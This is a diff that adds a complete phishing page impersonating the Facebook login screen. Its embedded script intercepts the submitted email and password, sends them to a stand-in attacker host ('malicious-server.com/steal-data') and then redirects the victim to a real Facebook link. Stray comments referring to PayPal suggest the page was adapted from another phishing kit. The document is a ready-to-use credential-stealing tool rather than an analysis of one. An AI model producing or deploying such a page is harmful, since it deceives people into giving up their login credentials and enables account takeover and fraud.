@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; text-align: center; padding: 50px; }
+        h1 { color: #0070ba; }
+        .form-container { background-color: white; padding: 30px; border-radius: 8px; box-shadow: 0px 0px 15px rgba(0,0,0,0.1); width: 300px; margin: auto; }
+        input { margin-bottom: 20px; padding: 10px; width: 100%; border: 1px solid #ccc; border-radius: 4px; }
+        .btn { background-color: #0070ba; color: white; border: none; padding: 10px; width: 100%; cursor: pointer; border-radius: 4px; }
+        .footer { color: #888; font-size: 12px; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <h1>Facebook</h1>
+    <p>Login to your Facebook account</p>
+    <div class="form-container">
+        <form id="login-form">
+            <input type="text" id="username" placeholder="Email or Mobile" required><br>
+            <input type="password" id="password" placeholder="Password" required><br>
+            <button type="submit" class="btn">Login</button>
+        </form>
+    </div>
+    <p class="footer">Facebook. All rights reserved.</p>
+
+    <script>
+        // The malicious script that captures the username and password
+        document.getElementById('login-form').onsubmit = function(event) {
+            event.preventDefault(); // Prevent the form from submitting
+
+            // Grab the entered username and password
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // Fake alert to simulate "error message"
+            // alert("Your login credentials have been successfully captured!");
+
+            // Normally, here the credentials would be sent to the attacker's server using something like this:
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://malicious-server.com/steal-data', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({ username: username, password: password }));
+
+            // Simulate redirection to the real PayPal site after the credentials are captured
+            window.location.href = "https://www.facebook.com/share/r/19aoi7Cnwa/"; // This redirects to the actual PayPal site
+        };
+    </script>
+</body>
+</html>
